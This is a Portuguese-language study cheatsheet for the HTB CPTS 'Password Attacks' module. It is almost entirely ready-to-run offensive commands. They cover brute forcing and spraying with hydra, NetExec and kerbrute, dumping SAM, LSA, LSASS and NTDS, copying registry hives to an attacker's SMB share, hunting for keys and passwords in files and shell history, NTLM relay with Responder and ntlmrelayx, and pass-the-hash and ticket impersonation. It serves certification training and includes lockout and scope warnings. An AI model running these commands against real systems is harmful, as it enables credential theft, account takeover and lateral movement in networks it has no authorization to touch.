---
tema: Password Attacks
tópico: Wordlists, brute force, spraying, cracking, credenciais locais e relay NTLM
tags: [htb, cpts, password-attack, hashcat, john, hydra, netexec, kerbrute, spraying, ntlm-relay, pass-the-hash, dpapi]
dificuldade: medium
---

# 🔑 CPTS 10 — Password Attacks

> [!info] Objetivo
> Espinha dorsal: a cheatsheet oficial do módulo (conexão ao alvo, mutação de wordlist, ataques remotos, credenciais locais Windows/Linux, cracking e pivô). **Antes de atacar, entenda a política de senha** — sem isso você tranca contas e queima o engajamento. Cada bloco abaixo diz o que o comando faz e quando usar.

> [!warning] Ordem obrigatória
> 1. Descobrir política de senha/lockout → 2. Montar wordlist → 3. Spray com **1 senha p/ N usuários** → 4. Só então brute force → 5. Hash → cracking.

---

## 🎯 Quando usar

| Situação | Técnica |
|----------|---------|
| Serviço exposto (SSH/FTP/RDP/WinRM/SMB/DB) | Hydra / NetExec / Medusa |
| Domínio AD, quer validar usuários | `kerbrute userenum` |
| Achou N usuários e quer testar 1 senha | **Password spraying** (respeitando lockout) |
| Coletou hash (NTLM, NetNTLMv2, TGS) | hashcat/john offline |
| Tem acesso local admin | SAM/LSA/LSASS/DPAPI/NTDS |
| Existe tráfego SMB autenticável | Relay NTLM (Responder + ntlmrelayx) |
| Encontrou hash de senha | **Pass-the-Hash** (não precisa crackear) |

---

## 🧰 Ferramentas

| Ferramenta | Papel |
|-----------|-------|
| `netexec` (nxc) | Protocolos SMB/WinRM/LDAP/MSSQL + dump de credenciais |
| `hydra` / `medusa` | Brute force online multi-protocolo |
| `kerbrute` | Enum de usuários/senhas via Kerberos (sem log de falha) |
| `hashcat` / `john` | Cracking offline |
| `*.py` (impacket) | secretsdump, ntlmrelayx, smbserver, getTGT/getST, wmiexec |
| `Responder` | Envenenamento LLMNR/NBT-NS/mDNS → captura NetNTLM |
| `pypykatz` / `mimikatz` / `kiwi` | Segredos em memória (LSASS) |
| `Pcredz` | Extrai credenciais de PCAP |

---

## 🔌 Connecting to Target

```bash
# RDP (senha com caractere especial: use aspas simples)
xfreerdp /v:<IP> /u:<USUARIO> /p:'<SENHA>'

# WinRM: shell remota em Windows com WinRM habilitado
evil-winrm -i <IP> -u <USUARIO> -p '<SENHA>'

# SSH
ssh <USUARIO>@<IP>

# SMB: lista de compartilhamentos com autenticação
smbclient -U <USUARIO> \\\\<IP>\\SHARENAME

# Compartilhar arquivo com o alvo via SMB (impacket)
python3 smbserver.py -smb2support CompData /home/<user>/Documents/
# Alvo Windows: copy \\<IP>\CompData\arquivo .
```

**Por que:** antes de atacar senha, você precisa de **um** ponto de acesso válido e de uma via de mover ferramentas. `smbserver.py` serve payload e recebe loot sem instalar nada no alvo.

---

## 🧬 Password Mutations e Wordlists

```bash
# cewl: monta wordlist a partir do conteúdo do site (sopa de palavras do alvo)
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
#                     -d profundidade | -m tamanho mínimo | --lowercase normaliza

# Aplicar regras do hashcat para MUTAR uma base (não precisa de GPU p/ isso)
hashcat --force password.list -r custom.rule --stdout > mut_password.list
# --stdout imprime o resultado em vez de crackear

# username-anarchy: gera variações de nomes (joao.silva, jsilva, silva.j...)
./username-anarchy -i /path/to/listoffirstandlastnames.txt

# Extensões/termos do alvo: "extrai" palavras úteis de uma página pública
curl -s https://fileinfo.com/filetypes/compressed | html2text \
  | awk '{print tolower($1)}' | grep "\." | tee -a compressed_ext.txt
```

```bash
# Wordlists base
ls -lh ~/wordlists/rockyou.txt              # 14M de senhas (já descompactado nesta máquina)
ls /usr/share/seclists/Passwords/           # Leaked-Databases, Common-Credentials
# Se baixar o .gz: gunzip ~/wordlists/rockyou.txt.gz
```

| Regra | Efeito |
|-------|--------|
| `best64.rule` | 64 mutações rápidas e gerais |
| `dive.rule` | Combina palavras com anos/símbolos |
| `rockyou-30000.rule` | Mais agressiva, muito usada |
| `--stdout` | Não crackeia: só imprime as mutações |

---

## 🌐 Remote Password Attacks

```bash
# NetExec (ex-crackmapexec): 1 senha testada contra vários usuários
netexec winrm <IP> -u user.list -p password.list

# Compartilhamentos
netexec smb <IP> -u "<USUARIO>" -p "<SENHA>" --shares

# Hydra: os quatro padrões
hydra -L user.list -P password.list <service>://<IP>     # listas x listas
hydra -l <USUARIO> -P password.list <service>://<IP>     # usuário fixo
hydra -L user.list -p <SENHA> <service>://<IP>           # 1 senha p/ N users
hydra -C <user_pass.list> ssh://<IP>                     # combos user:pass

# Serviços: ssh, ftp, rdp, smb, mysql, mssql, winrm, vnc, http-post-form
hydra -l admin -P ~/wordlists/rockyou.txt -f -t 4 <IP> http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# Medusa: alternativa quando hydra tem problemas com o módulo
medusa -h <IP> -u <USUARIO> -P password.list -M ssh -t 4 -f
```

```bash
# Dump de credenciais locais via NetExec (precisa de admin local)
netexec smb <IP> --local-auth -u <USUARIO> -p '<SENHA>' --sam    # hashes SAM
netexec smb <IP> --local-auth -u <USUARIO> -p '<SENHA>' --lsa    # segredos LSA
netexec smb <IP> -u <USUARIO> -p '<SENHA>' --ntds                # NTDS.dit (DC)

# Pass-the-Hash: usa o hash direto, sem crackear
evil-winrm -i <IP> -u Administrator -H "<HASH>"

# Pcredz: extrai credenciais de um PCAP (HTTP/NTLM/Kerberos)
./Pcredz -f demo.pcapng -t -v
```

```bash
# kerbrute: enum de usuários e spraying via Kerberos
kerbrute userenum -d <DOMINIO> --dc <IP> users.txt                       # valida usuários
kerbrute passwordspray -d <DOMINIO> --dc <IP> users.txt '<SENHA>'        # 1 senha, N users
kerbrute bruteuser -d <DOMINIO> --dc <IP> -p '<SENHA>' users.txt         # N senhas, 1 user
```

---

## 🏛️ Política de senha (faça isso primeiro)

```bash
# Windows: idade, tamanho mínimo, limite de erros e lockout
net accounts
net accounts /domain                      # política do domínio (DC)

# Remoto: política via SMB
netexec smb <IP> --pass-pol
enum4linux-ng -P <IP>
rpcclient -U "" -N <IP> -c 'getdompwinfo'   # tamanho mínimo/complexidade

# LDAP: limiares de lockout do domínio
ldapsearch -x -H ldap://<IP> -D '<USUARIO>@<DOMINIO>' -w '<SENHA>' \
  -b "DC=<DOMINIO>,DC=<TLD>" "(objectClass=domainDNS)" lockoutThreshold lockoutDuration
```

| Achado | Impacto operacional |
|--------|---------------------|
| `lockoutThreshold: 0` | Sem bloqueio → brute force liberado (mas ruidoso) |
| `lockoutThreshold: 5` | **Nunca** passe 4 tentativas por janela |
| `Minimum password length: 8` | Wordlist abaixo disso é desperdício |
| `Password history: 24` | Não sugira "trocar para a antiga" |

> [!danger] Password spraying sem ler lockout = DoS de contas de produção. Sempre one-password-many-users, lento (`-t 1`), e conte tentativas por janela de `lockoutDuration`.

---

## 🪟 Windows Local Password Attacks

```cmd
:: 1) Onde estão os segredos? Processos e serviços que rodam como outro usuário
tasklist /svc
Get-Process lsass

:: 2) Caça a senhas em arquivos de config/script no disco
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
reg query HKLM /f password /t REG_SZ /s
```

```bash
# 3) LSASS: dump do processo e parser offline (pypykatz) — sem mimikatz no alvo
pypykatz lsa minidump /path/to/lsassdumpfile
```

```cmd
:: 4) Colher as hives SAM/SECURITY/SYSTEM (requer admin)
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\security C:\security.save
reg.exe save hklm\system C:\system.save
move sam.save \\<IP>\NameofFileShare        :: manda para o SMB do atacante
```

```bash
# 5) Cracking/dump offline das hives
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL

# 6) NTDS.dit (DC) via shadow copy — não trava o NTDS.dit em uso
```

```cmd
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

```cmd
:: 7) Credenciais guardadas pelo Windows e pelo usuário
rundll32 keymgr.dll,KRShowKeyMgr     :: Credential Manager (GUI)
cmdkey /list                         :: credenciais salvas do usuário atual
runas /savecred /user:<USUARIO> cmd  :: reusa credencial salva (se existir)

:: 8) Caça automática em shares/SMB (muito ruidoso — escopo autorizado)
snaffler.exe -s
Invoke-HuntSMBShares -Threads 100 -OutputDirectory c:\Users\Public
```

> [!tip] DPAPI
> Segredos de navegador/credential manager são DPAPI: precisa da masterkey do usuário (via LSASS ou do diretório `%APPDATA%\Microsoft\Protect`). Ferramentas: `mimikatz`/`kiwi` (`dpapi::cred`, `dpapi::masterkey`) e SharpDPAPI. Sem a masterkey, os blobs não abrem.

---

## 🐧 Linux Local Password Attacks

```bash
# 1) Configs e scripts: senhas em texto claro vivem aqui
find / -type f \( -name "*.conf" -o -name "*.config" -o -name "*.cnf" \) 2>/dev/null
grep -rniE "pass(word|wd)?\s*=" /var/www /opt /srv 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*/          # scripts de cron às vezes têm credencial
```

```bash
# 2) Chaves e histórico
grep -rnw "PRIVATE KEY" /* /home/* 2>/dev/null | grep ":1"
grep -rnw "ssh-rsa" /home/* 2>/dev/null
tail -n5 /home/*/.bash*                        # comandos/histórico com senha digitada
```

```bash
# 3) Segredos em memória e em navegador
python3 mimipenguin.py                         # credenciais de login em memória
bash mimipenguin.sh
python2.7 lazagne.py all
python3 lazagne.py browsers

# 4) Firefox: logins salvos (decrypt com key4.db + logins.json)
ls -l .mozilla/firefox/ | grep default
cat .mozilla/firefox/<PERFIL>.default-release/logins.json | jq .
python3.9 firefox_decrypt.py
```

---

## 🧮 Cracking Passwords

```bash
# Modos hashcat que você mais usa
hashcat -m 0     md5.list      ~/wordlists/rockyou.txt   # MD5
hashcat -m 1000  ntlm.txt      ~/wordlists/rockyou.txt   # NTLM (o rei no AD)
hashcat -m 1800  shadow.txt    ~/wordlists/rockyou.txt   # sha512crypt ($6$)
hashcat -m 5600  netntlmv2.txt ~/wordlists/rockyou.txt   # NetNTLMv2 (Responder)
hashcat -m 13100 tgs.txt       ~/wordlists/rockyou.txt   # Kerberoast (TGS-REP RC4)

# Modos extras citados na sheet oficial
hashcat -m 500   md5crypt.list ~/wordlists/rockyou.txt   # md5crypt ($1$)
hashcat -m 22100 backup.hash   ~/wordlists/rockyou.txt -o backup.cracked   # BitLocker
hashcat -m 1000  dumpedhashes.txt --show      # mostra o que já foi quebrado
```

| Flag hashcat | Efeito |
|--------------|--------|
| `-a 0` | Modo dictionary (padrão) |
| `-a 3` | Máscara (`?l?u?d?s`) |
| `-r regra` | Aplica regras de mutação |
| `-O` | Kernels otimizados (limita tamanho de senha) |
| `-w 3` | Perfil de carga alto |
| `--username` | Ignora o prefixo `user:` no arquivo |

```bash
# John: quando o formato é esquisito, john adivinha
john --wordlist=~/wordlists/rockyou.txt hashes.txt
john --format=NT hashes.txt --rules
john hashes.txt --show

# /etc/passwd + /etc/shadow -> formato crackeável
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes
hashcat -m 1800 /tmp/unshadowed.hashes ~/wordlists/rockyou.txt

# Conversores *2john para formatos de arquivo
ssh2john.py SSH.private > ssh.hash
john ssh.hash --show
office2john.py protected.docx > docx.hash
john --wordlist=~/wordlists/rockyou.txt docx.hash
zip2john backup.zip > zip.hash
bitlocker2john -i Backup.vhd > backup.hashes
pdf2john.py doc.pdf > pdf.hash
```

```bash
# Força bruta em arquivo cifrado com openssl (loop de dicionário)
for s in $(cat ~/wordlists/rockyou.txt); do
  openssl enc -aes-256-cbc -d -in GZIP.gzip -k "$s" >/dev/null 2>&1 && echo "SENHA: $s" && break
done
```

---

## 🔗 Relay NTLM e movimentação

```bash
# 1) Descobrir quem NÃO exige assinatura SMB (relayáveis)
netexec smb <IP_RANGE> --gen-relay-list relay_targets.txt

# 2) Responder envenenando LLMNR/NBT-NS (desligue SMB/HTTP para relaying)
sudo responder -I eth0 -rdwv

# 3) Relay para SMB/LDAP em vez de só capturar
ntlmrelayx.py -tf relay_targets.txt -smb2support -socks
ntlmrelayx.py -t ldap://<DC> --escalate-user <USUARIO>   # RBCD abuse
```

```bash
# Pass-the-Hash / Pass-the-Ticket
netexec smb <IP> -u Administrator -H <HASH>
psexec.py -hashes :<HASH> <DOMINIO>/Administrator@<IP>
wmiexec.py -hashes :<HASH> <DOMINIO>/Administrator@<IP>

# Kerberos: pedir TGT/TGS e injetar na sessão
getTGT.py <DOMINIO>/<USUARIO>:<SENHA>
export KRB5CCNAME=<USUARIO>.ccache
getST.py -spn cifs/<HOST>.<DOMINIO> <DOMINIO>/<USUARIO>:<SENHA> -impersonate Administrator
# No Windows: Rubeus/kekeo  ->  sekurlsa::tickets /export  +  kerberos::ptt ticket.kirbi
```

| Sigla | Significado |
|-------|-------------|
| PTH | Pass-the-Hash: autentica com o hash NTLM |
| PTT | Pass-the-Ticket: injeta ticket Kerberos |
| Overpass-the-Hash | Usa o hash para pedir TGT Kerberos |
| Silver/Golden Ticket | Forja TGS/TGT com krbtgt comprometido |

---

## 🌐 Pivoting (fim da sheet oficial)

```bash
# SOCKS via SSH: usa o host comprometido como proxy
ssh -D 9050 <USUARIO>@<DMZ01>

# /etc/proxychains.conf
# [ProxyList]
# socks4  127.0.0.1 9050

# Scan via proxy (somente TCP connect)
proxychains -q nmap -sT -Pn <IP> --open
proxychains xfreerdp /v:<IP> /u:<USUARIO> /p:'<SENHA>'
```

---

## 🔍 Credenciais em arquivos (a busca que ninguém faz)

| Alvo | Onde olhar |
|------|-----------|
| Web | `wp-config.php`, `web.config`, `.env`, `.git/config`, backups `*.bak/.old` |
| Windows | `unattend.xml`, `sysprep.inf`, `C:\Python*\`, `ConsoleHost_history.txt` |
| Linux | `/home/*/.bash_history`, `.ssh/`, cron, systemd units, `docker-compose.yml` |
| Scripts | `grep -rniE "(pass|pwd|secret|token)" /opt /srv /var/www` |
| Rede | Bancos: `nxc mssql <IP> -u u -p p -q "SELECT name FROM sys.databases"` |

---

## ⚠️ Pegadinhas

- Não leu `--pass-pol`? Você vai bloquear contas no meio do teste.
- Brute force com `-t 8+` em serviço de auth sensível derruba o serviço ou gera alerta.
- Hash NTLM de conta de máquina (`$`) geralmente é rotacionado: não perca tempo crackeando.
- `--local-auth` é obrigatório quando a senha é local (fora do domínio) — sem isso o nxc fala com o DC.
- Kerberos não tolera clock desalinhado: `ntpdate`/`chrony` antes ou preauth falha.
- Relay NTLM exige que SMB signing esteja **desabilitado** e que você desligue SMB/HTTP no Responder.
- `hashdump`/`--sam` precisam de SYSTEM/admin; como usuário comum só resta DPAPI/histórico.
- DPAPI sem masterkey = lixo criptografado. Colete `Protect\` + `Credentials\` juntos.
- Wordlist com CRLF não casa senha em Linux — normalize com `dos2unix`.

## ✅ Checklist rápido

- [ ] Política de senha/lockout lida antes de atacar
- [ ] Wordlist própria (cewl/anarchy/mutação) + regras
- [ ] Spray one-password-many-users com throttle
- [ ] nxc por protocolo (smb/winrm/ldap/mssql) após ter 1 credencial
- [ ] Hashes classificados e modo hashcat correto
- [ ] PTH testado antes de crackear (economia de tempo)
- [ ] Credenciais locais: SAM/LSA/LSASS/DPAPI/NTDS conforme privilégio
- [ ] Relay avaliado se houver tráfego SMB sem signing
- [ ] Pivô configurado (SOCKS) e novos hosts reenumerados

## 🔗 Relacionado

- [[CPTS 11 - Attacking Common Services]]
- [[CPTS 13 - Active Directory Enumeration and Attacks]]
- [[Fase 04 - Enumeração de Serviços]]
- [[Fase 09 - Active Directory]]
- [[Fase 11 - Pós-Exploração]]
